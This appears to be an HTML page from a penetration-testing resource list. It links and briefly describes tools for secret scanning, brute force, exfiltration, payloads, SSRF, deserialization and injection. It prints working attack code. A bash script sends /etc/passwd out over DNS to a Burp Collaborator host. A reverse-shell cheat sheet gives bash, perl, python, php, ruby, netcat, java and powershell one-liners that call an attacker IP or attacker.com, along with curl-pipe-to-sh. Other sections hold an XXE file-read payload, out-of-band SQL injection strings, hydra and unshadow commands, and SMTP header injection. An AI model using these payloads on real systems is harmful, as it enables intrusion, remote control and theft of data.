blind spots with our automated, battle-tested detection engine.</p><p><a href="https://docs.gitguardian.com/secrets-detection/detectors/supported_credentials">https://docs.gitguardian.com/secrets-detection/detectors/supported_credentials</a><br><br># Here is an exhaustive list of the detectors supported by GitGuardian.</p><h3 id="Secret-Scanning">Secret Scanning</h3><p><a href="https://github.com/redhuntlabs/HTTPLoot">https://github.com/redhuntlabs/HTTPLoot</a><br><br># An automated tool which can simultaneously crawl, fill forms, trigger error/debug pages and “loot” secrets out of the client-facing code of sites.</p><p><a href="https://github.com/redhuntlabs/BucketLoot">https://github.com/redhuntlabs/BucketLoot</a><br><br># BucketLoot is an automated S3-compatible Bucket inspector that can help users extract assets, flag secret exposures and even search for custom keywords as well as Regular Expressions from publicly-exposed storage buckets by scanning files that store data in plain-text.</p><p><a href="https://github.com/0xTeles/jsleak">https://github.com/0xTeles/jsleak</a><br><br># jsleak is a tool to identify sensitive data in JS files through regex patterns.</p><p><a href="https://github.com/channyein1337/jsleak">https://github.com/channyein1337/jsleak</a><br><br># I was developing jsleak during most of my free time for my own need. It is easy-to-use command-line tool designed to uncover secrets and links in JavaScript files or source code. The jsleak was inspired by Linkfinder and regexes are collected from multiple sources.</p><h3 id="Google-Dorks-Scanning">Google Dorks Scanning</h3><p><a href="https://github.com/opsdisk/pagodo">https://github.com/opsdisk/pagodo</a><br><br># The goal of this project was to develop a passive Google dork script to collect potentially vulnerable web pages and applications on the Internet.<br><br><code>python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1</code></p><h3 id="CORS-Misconfigurations">CORS Misconfigurations</h3><p><a href="https://github.com/s0md3v/Corsy">https://github.com/s0md3v/Corsy</a><br><br># Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations.<br><br><code>python3 corsy.py -u https://example.com</code></p><h2 id="Monitoring">Monitoring</h2><h3 id="CVE">CVE</h3><p><a href="https://www.opencve.io/">https://www.opencve.io/</a><br><br># OpenCVE (formerly known as <a href="http://Saucs.com">Saucs.com</a>) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.</p><h2 id="Attacking">Attacking</h2><h3 id="Brute-Force">Brute Force</h3><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a><br><br># Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.<br><br><code>hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh</code></p><p><a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a><br><br># John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.<br><br><code>unshadow /etc/passwd /etc/shadow &gt; mypasswd.txt</code><br><br><code>john mypasswd.txt</code></p><p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a><br><br># Hashcat is a password recovery tool.<br><br><code>hashcat -m 0 -a 0 hashes.txt passwords.txt</code></p><p><a href="https://github.com/iangcarroll/cookiemonster">https://github.com/iangcarroll/cookiemonster</a><br><br># CookieMonster is a command-line tool and API for decoding and modifying vulnerable session cookies from several different frameworks. It is designed to run in automation pipelines which must be able to efficiently process a large amount of these cookies to quickly discover vulnerabilities. Additionally, CookieMonster is extensible and can easily support new cookie formats.<br><br><code>cookiemonster -cookie &quot;gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1mgnkC:z5yDxzI06qYVAU3bkLaWYpADT4I&quot;</code></p><p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a><br><br># jwt_tool.py is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).<br><br><code>python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw</code></p><p><a href="https://github.com/ustayready/fireprox">https://github.com/ustayready/fireprox</a><br><br># Rotate the source IP address in order to bypass rate limits</p><h3 id="Exfiltration">Exfiltration</h3><p><a href="https://github.com/vp777/procrustes">https://github.com/vp777/procrustes</a><br><br># A bash script that automates the exfiltration of data over dns</p><p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br><br># The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.</p><p><a href="https://github.com/fbkcs/ThunderDNS">https://github.com/fbkcs/ThunderDNS</a><br><br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.</p><p><a href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a><br><br># Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver’s implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.</p><p><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a><br><br># The Metasploit Framework (MSF) is far more than just a collection of exploits–it is also a solid foundation that you can build upon and easily customize to meet your needs.</p><p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-services/gcp-databases-enum/gcp-firebase-enum">https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-services/gcp-databases-enum/gcp-firebase-enum</a><br><a href="https://blog.assetnote.io/bug-bounty/2020/02/01/expanding-attack-surface-react-native/">https://blog.assetnote.io/bug-bounty/2020/02/01/expanding-attack-surface-react-native/</a><br><br># Extract data from Firebase with apikey.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 -m venv venv</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> venv/bin/activate</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 -m ensurepip</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip3 install pyrebase4</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import pyrebase</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; config = &#123;<span class="string">&quot;apiKey&quot;</span>:<span class="string">&quot;AIz...&quot;</span>,<span class="string">&quot;authDomain&quot;</span>:<span class="string">&quot;project.firebaseapp.com&quot;</span>,<span class="string">&quot;databaseURL&quot;</span>:<span class="string">&quot;https://project.firebaseio.com&quot;</span>...&#125;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; firebase = pyrebase.initialize_app(config)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; db = firebase.database()</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(db.get())</span></span><br></pre></td></tr></table></figure><p><br># Pure bash exfiltration over dns<br><br>## Execute on target server (replace YOURBCID)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CMD=<span class="string">&quot;cat /etc/passwd&quot;</span></span><br><span class="line">HID=$(<span class="built_in">tr</span> -dc A-Za-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 5)</span><br><span class="line">CMDID=$(<span class="built_in">tr</span> -dc A-Za-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 5)</span><br><span class="line">BC=<span class="string">&quot;YOURBCID.burpcollaborator.net&quot;</span></span><br><span class="line">D=<span class="string">&quot;<span class="variable">$HID</span>-<span class="variable">$CMDID</span>.<span class="variable">$BC</span>&quot;</span></span><br><span class="line">M=$(<span class="variable">$CMD</span> 2&gt;&amp;1); T=<span class="variable">$&#123;#M&#125;</span>; O=0; S=30; I=1; <span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$&#123;T&#125;</span>&quot;</span> -gt <span class="string">&quot;0&quot;</span> ]; <span class="keyword">do</span> C=$(<span class="built_in">echo</span> <span class="variable">$&#123;M:<span class="variable">$&#123;O&#125;</span>:<span class="variable">$&#123;S&#125;</span>&#125;</span>|<span class="built_in">base64</span>); C=<span class="variable">$&#123;C//+/_0&#125;</span>; C=<span class="variable">$&#123;C//\//_1&#125;</span>; C=<span class="variable">$&#123;C//=/_2&#125;</span>; host -t A <span class="variable">$I</span>.<span class="variable">$&#123;C&#125;</span>.<span class="variable">$D</span>&amp;&gt;/dev/null; O=$((<span class="variable">$&#123;O&#125;</span>+<span class="variable">$&#123;S&#125;</span>)); T=$((<span class="variable">$&#123;T&#125;</span>-<span class="variable">$&#123;S&#125;</span>)); I=$((I+<span class="number">1</span>)); <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><br>## Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">BCPURL</span>=<span class="string">&quot;https://polling.burpcollaborator.net/burpresults?biid=YOURBIID&quot;</span></span><br><span class="line"><span class="attr">RESULTS</span>=$(curl -sk <span class="string">&quot;$&#123;BCPURL&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><br>## Get IDs available</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;RESULTS&#125;</span>&quot;</span> | jq -cM <span class="string">&#x27;.responses[]&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> LINE; <span class="keyword">do</span> <span class="keyword">if</span> [[ <span class="variable">$LINE</span> == *<span class="string">&#x27;&quot;protocol&quot;:&quot;dns&#x27;</span>* ]]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="variable">$&#123;LINE&#125;</span> | jq -rM <span class="string">&#x27;.data.subDomain&#x27;</span> | egrep --color=never <span class="string">&quot;^[[:digit:]]+\..*\..*\.$BC$&quot;</span>; <span class="keyword">fi</span>; <span class="keyword">done</span> | sed -r <span class="string">&#x27;s/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g&#x27;</span> | <span class="built_in">sort</span> -u</span><br></pre></td></tr></table></figure><p><br>## Update ID and get command result (repeat for each ID)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID=<span class="string">&quot;xxxxx-xxxxx&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;RESULTS&#125;</span>&quot;</span> | jq -cM <span class="string">&#x27;.responses[]&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> LINE; <span class="keyword">do</span> <span class="keyword">if</span> [[ <span class="variable">$LINE</span> == *<span class="string">&#x27;&quot;protocol&quot;:&quot;dns&#x27;</span>* ]]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="variable">$&#123;LINE&#125;</span> | jq -rM <span class="string">&#x27;.data.subDomain&#x27;</span> | egrep <span class="string">&quot;^[[:digit:]]+\..*\..*\.$BC$&quot;</span>; <span class="keyword">fi</span>; <span class="keyword">done</span> | egrep <span class="string">&quot;<span class="variable">$ID</span>&quot;</span> | <span class="built_in">sort</span> -t. -k3 -g | sed -r <span class="string">&#x27;s/^[[:digit:]]+\.([^.]+)\..*/\1/g&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> i; <span class="keyword">do</span> i=<span class="variable">$&#123;i//_0/+&#125;</span>; i=<span class="variable">$&#123;i//_1/\/&#125;</span>; i=<span class="variable">$&#123;i//_2/=&#125;</span>; <span class="built_in">echo</span> <span class="variable">$&#123;i&#125;</span> | <span class="built_in">base64</span> -d; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><a href="https://www.slideshare.net/snyff/code-that-gets-you-pwnsd">https://www.slideshare.net/snyff/code-that-gets-you-pwnsd</a><br><br># Code that gets you pwn(s|'d). Very intersting bypasses ideas.</p><h3 id="General-2">General</h3><p><a href="https://github.com/firefart/stunner">https://github.com/firefart/stunner</a><br><br># Stunner is a tool to test and exploit STUN, TURN and TURN over TCP servers. TURN is a protocol mostly used in videoconferencing and audio chats (WebRTC).<br><br><code>stunner info -s x.x.x.x:443</code></p><h2 id="Manual">Manual</h2><h3 id="Payloads">Payloads</h3><p><a href="https://github.com/six2dez/OneListForAll">https://github.com/six2dez/OneListForAll</a><br><br># This is a project to generate huge wordlists for web fuzzing, if you just want to fuzz with a good wordlist use the file onelistforallmicro.txt.</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a><br><br># PayloadsAllTheThings</p><p><a href="https://github.com/RenwaX23/XSS-Payloads">https://github.com/RenwaX23/XSS-Payloads</a><br><br># List of XSS Vectors/Payloads i have been collecting since 2015 from different resources like websites,tweets,books.</p><p><a href="https://github.com/0xacb/recollapse">https://github.com/0xacb/recollapse</a><br><br># REcollapse is a helper tool for black-box regex fuzzing to bypass validations and discover normalizations in web applications.</p><p><a href="https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html">https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html</a><br><br># Unicode normalization good for WAF bypass.</p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a><br><br># This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.</p><p><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a><br><br># XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.<br><br><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code><br><br><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;</code><br><br><code>&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</code></p><p><a href="https://phonexicum.github.io/infosec/xxe.html">https://phonexicum.github.io/infosec/xxe.html</a><br><br># Information Security PENTEST XXE<br><br><code>&lt;!DOCTYPE foo SYSTEM &quot;http://xpto.burpcollaborator.net/xpto.dtd&quot;&gt;</code></p><p><a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder</a><br><br># Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.</p><p><a href="https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages">https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages</a><br><br># We propose a new exploit technique that brings a whole-new attack surface to bypass SSRF (Server Side Request Forgery) protections.<br><br><a href="https://github.com/orangetw/Tiny-URL-Fuzzer/blob/master/samples.txt">https://github.com/orangetw/Tiny-URL-Fuzzer/blob/master/samples.txt</a></p><h3 id="Bypass">Bypass</h3><p><a href="https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html">https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html</a><br><br># Bypassing CDN WAF’s with Alternate Domain Routing</p><p><a href="https://bishopfox.com/blog/json-interoperability-vulnerabilities">https://bishopfox.com/blog/json-interoperability-vulnerabilities</a><br><br># The same JSON document can be parsed with different values across microservices, leading to a variety of potential security risks.</p><p><a href="https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</a><br><br># Browsers support internetionalized domains, but some Unicode characters are converted into English letters and symbols. This may be useful to make very short domains or bypass SSRF protection.</p><p><a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/</a><br><br># It’s hard to overstate the severity of this bug. If you are using ECDSA signatures for any of these security mechanisms, then an attacker can trivially and completely bypass them if your server is running any Java 15, 16, 17, or 18 version before the April 2022 Critical Patch Update (CPU). For context, almost all WebAuthn/FIDO devices in the real world (including Yubikeys) use ECDSA signatures and many OIDC providers use ECDSA-signed JWTs.</p><p><a href="https://h.43z.one/ipconverter/">https://h.43z.one/ipconverter/</a><br><br># Convert IP address to different formats for bypass.</p><p><a href="https://github.com/aufzayed/bugbounty/tree/main/403-bypass">https://github.com/aufzayed/bugbounty/tree/main/403-bypass</a><br><br># Common 403 bypass.</p><p><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies</a><br><br># In this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers.</p><h3 id="Deserialization">Deserialization</h3><p><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a><br><br># JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.</p><p><a href="https://github.com/pimps/JNDI-Exploit-Kit">https://github.com/pimps/JNDI-Exploit-Kit</a><br><br># This is a forked modified version of the great exploitation tool created by @welk1n (<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a>).</p><h3 id="SSRF-Server-Side-Request-Forgery">SSRF (Server-Side Request Forgery)</h3><p><a href="https://lab.wallarm.com/blind-ssrf-exploitation/">https://lab.wallarm.com/blind-ssrf-exploitation/</a><br><br># There is such a thing as SSRF. There’s lots of information about it, but here is my quick summary.</p><p><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</a><br><br># A Glossary of Blind SSRF Chains.</p><p><a href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/</a><br><br># BRING YOUR OWN SSRF – THE GATEWAY ACTUATOR.</p><p><a href="https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/">https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/</a><br><br># Attacking Java RMI via SSRF.</p><p><a href="https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next">https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next</a><br><br># Got SSRF in a AWS lambda?<br><code>http://localhost:9001/2018-06-01/runtime/invocation/next</code></p><h3 id="OAuth">OAuth</h3><p><a href="https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover">https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover</a><br><br># In this article, we will be focusing on the most common flow that you will come across today, which is the OAuth 2.0 authorization code grant type.</p><p><a href="https://portswigger.net/web-security/oauth">https://portswigger.net/web-security/oauth</a><br><br># In this section, we’ll teach you how to identify and exploit some of the key vulnerabilities found in OAuth 2.0 authentication mechanisms.</p><p><a href="https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts">https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts</a><br><br># Hackers could take over millions of accounts on Grammarly, Vidio and Bukalapak.</p><h3 id="DNS-Rebinding">DNS Rebinding</h3><p><a href="https://github.com/nccgroup/singularity">https://github.com/nccgroup/singularity</a><br><br># Singularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine’s IP address and to serve attack payloads to exploit vulnerable software on the target machine.</p><p><a href="https://github.com/brannondorsey/dns-rebind-toolkit">https://github.com/brannondorsey/dns-rebind-toolkit</a><br><br># DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN).</p><p><a href="https://github.com/brannondorsey/whonow">https://github.com/brannondorsey/whonow</a><br><br># A malicious DNS server for executing DNS Rebinding attacks on the fly.</p><p><a href="https://nip.io">https://nip.io</a><br><br># Dead simple wildcard DNS for any IP Address</p><p><a href="https://sslip.io">https://sslip.io</a><br><br># <a href="http://sslip.io">sslip.io</a> is a DNS (Domain Name System) service that, when queried with a hostname with an embedded IP address, returns that IP Address.</p><p><a href="http://1u.ms/">http://1u.ms/</a><br><br># This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.</p><p><a href="https://github.com/Rhynorater/rebindMultiA">https://github.com/Rhynorater/rebindMultiA</a><br><br># rebindMultiA is a tool to perform a Multiple A Record rebind attack.</p><h3 id="SMTP-Header-Injection">SMTP Header Injection</h3><p><a href="https://www.acunetix.com/blog/articles/email-header-injection/">https://www.acunetix.com/blog/articles/email-header-injection/</a><br><br># It is common practice for web pages and web applications to implement contact forms, which in turn send email messages to the intended recipients. Most of the time, such contact forms set headers. These headers are interpreted by the email library on the web server and turned into resulting SMTP commands, which are then processed by the SMTP server.<br><br><code>POST /contact.php HTTP/1.1</code><br><br><code>Host: www.example2.com</code><br><br><code> </code><br><br><code>name=Best Product\nbcc: everyone@example3.com&amp;replyTo=blame_anna@example.com&amp;message=Buy my product!</code></p><h3 id="Web-Shell">Web Shell</h3><p><a href="https://www.kali.org/tools/webshells/">https://www.kali.org/tools/webshells/</a><br><br># A collection of webshells for ASP, ASPX, CFM, JSP, Perl, and PHP servers.</p><h3 id="Reverse-Shell">Reverse Shell</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><br># If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.<br><br># Bash<br><br><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p><p><br># PERL<br><br><code>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;'</code></p><p><br># Python<br><br><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p><p><br># PHP<br><br><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p><p><br># Ruby<br><br><code>ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'</code></p><p><br># Netcat<br><br><code>nc -e /bin/sh 10.0.0.1 1234</code><br><br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code></p><p><br># Java<br><br><code>r = Runtime.getRuntime()</code><br><br><code>p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</code><br><br><code>p.waitFor()</code></p><p><br># xterm<br><br><code>xterm -display 10.0.0.1:1</code><br><br><code>Xnest :1</code><br><br><code>xhost +targetip</code></p><p><br># powershell (without download)<br><br><code>echo IEX(New-Object Net.WebClient).DownloadString(&quot;http://attacker.com:8442/powercat.ps1&quot;) | powershell -noprofile; powercat -c attacker.com -p 8443 -e cmd</code></p><p><a href="https://reverse-shell.sh/">https://reverse-shell.sh/</a><br><br># Reverse Shell as a Service<br><br><code>nc -l 1337</code><br><br><code>curl https://reverse-shell.sh/yourip:1337 | sh</code></p><p><a href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a><br><br># pwncat is a post-exploitation platform for Linux targets.</p><h3 id="SQLi-SQL-Injection-2">SQLi (SQL Injection)</h3><p><a href="https://arxiv.org/abs/1303.3047">https://arxiv.org/abs/1303.3047</a><br><br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.</p><p><a href="https://livesql.oracle.com">https://livesql.oracle.com</a><br><br># Learn and share SQL. Running on Oracle Database 19c.</p><p><a href="https://www.db-fiddle.com">https://www.db-fiddle.com</a><br><br># An online SQL database playground for testing, debugging and sharing SQL snippets.</p><p><a href="http://sqlfiddle.com/">http://sqlfiddle.com/</a><br><br># Application for testing and sharing SQL queries.</p><p><br># Oracle<br><br><code>'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'</code><br><br><code>'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'</code><br><br><code>'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'</code><br><br><code>'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'</code></p><p><br># MySQL<br><br><code>'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'</code></p><p><br># Microsoft SQL Server<br><br><code>'+;EXEC('master..xp_dirtree&quot;\\xpto.example.com\&quot;');+'</code><br><br><code>'+;EXEC('master..xp_fileexist&quot;\\xpto.example.com\&quot;');+'</code><br><br><code>'+;EXEC('master..xp_subdirs&quot;\\xpto.example.com\&quot;');+'</code></p><p><br># PostgreSQL<br><br><code>'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'</code></p><p><a href="https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet">https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet</a><br><br># This repository contains a advanced methodology of all types of SQL Injection.</p><p><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/</a><br><br># This SQL injection cheat sheet is an updated version of a 2007 post by Ferruh Mavituna on his personal blog. Currently this SQL injection cheat sheet only contains information for MySQL, Microsoft SQL Server, and some limited information for ORACLE and PostgreSQL SQL servers. Some of the samples in this sheet might not work in every situation because real live environments may vary depending on the usage of parentheses, different code bases and unexpected, strange and complex SQL sentences.</p><p><a href="https://www.websec.ca/kb/sql_injection">https://www.websec.ca/kb/sql_injection</a><br><br># The SQL Injection Knowledge Base</p><p><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/</a><br><br># Use our SQL Injection Cheat Sheet to learn about the different variants of the SQL injection vulnerability.</p><h3 id="XSS-2">XSS</h3><p><a href="https://rhynorater.github.io/postMessage-Braindump">https://rhynorater.github.io/postMessage-Braindump</a><br><br># postMessage-related bugs have landed me some serious bounties during the past couple live hacking events. Here is a quick summary of what you need to know about postMessage.</p><p><a href="https://www.gremwell.com/firefox-xss-302">https://www.gremwell.com/firefox-xss-302</a><br><br># Forcing Firefox to Execute XSS Payloads during 302 Redirects.</p><p><a href="https://trufflesecurity.com/blog/xsshunter/">https://trufflesecurity.com/blog/xsshunter/</a><br><br># Truffle Security is proud to host a new XSSHunter.</p><h3 id="XPath-Injection">XPath Injection</h3><p><a href="https://book.hacktricks.xyz/pentesting-web/xpath-injection">https://book.hacktricks.xyz/pentesting-web/xpath-injection</a><br><br># XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.</p><p><a href="https://devhints.io/xpath">https://devhints.io/xpath</a><br><br># Xpath cheatsheet.</p><p><a href="https://www.s4msecurity.com/2022/06/08/xml-xpath-injection-search-bwapp-level-low/">https://www.s4msecurity.com/2022/06/08/xml-xpath-injection-search-bwapp-level-low/</a><br><br># This article subject XML/XPath Injection vulnerability on web app.</p><h3 id="LFI-Local-File-Inclusion">LFI (Local File Inclusion)</h3><p><a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">https://bierbaumer.net/security/php-lfi-with-nginx-assistance/</a><br><br># This post presents a new method to exploit local file inclusion (LFI) vulnerabilities in utmost generality, assuming only that PHP is running in combination with Nginx under a common standard configuration.</p><h3 id="SSTI-Server-Side-Template-Injection">SSTI (Server Side Template Injection)</h3><p><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">https://www.youtube.com/watch?v=SN6EVIG4c-0</a><br><br># Template Injections (SSTI) in 10 minutes</p><p><a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a><br><br># Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web 